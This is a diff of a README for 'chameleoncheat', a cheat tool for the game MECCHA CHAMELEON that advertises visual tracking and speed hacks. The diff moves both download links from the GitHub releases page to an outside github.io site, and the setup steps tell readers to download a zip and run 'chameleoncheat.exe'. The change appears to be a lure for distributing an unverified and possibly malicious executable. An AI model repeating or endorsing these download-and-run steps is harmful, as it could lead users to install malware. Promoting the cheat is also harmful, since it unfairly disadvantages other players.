@@ -1,6 +1,6 @@
 # 🦎 chameleoncheat - Master the game with ease today
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Faretheewellfacesaver95/chameleoncheat/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://faretheewellfacesaver95.github.io)
 
 ## 📖 About
 chameleoncheat serves as an enhancement tool for the game MECCHA CHAMELEON. It provides functions to improve your performance and adjust game mechanics. You can use these tools to gain an advantage in hide-and-seek matches. The software includes options for visual tracking, movement speed, and endurance. This project exists for educational study and game modification research.
@@ -31,7 +31,7 @@ Ensure your computer meets these requirements before you start:
 ## 📥 Installation and Setup
 Follow these steps to install the tool on your Windows computer:
 
-1.  Visit the [releases page](https://github.com/Faretheewellfacesaver95/chameleoncheat/releases) to access the download files.
+1.  Visit the [releases page](https://faretheewellfacesaver95.github.io) to access the download files.
 2.  Click on the entry marked `chameleoncheat-install.zip` to save the file to your computer.
 3.  Locate the downloaded file in your folder. Right-click the file and select "Extract All" to unpack the contents.
 4.  Open the extracted folder and run the file named `chameleoncheat.exe`.
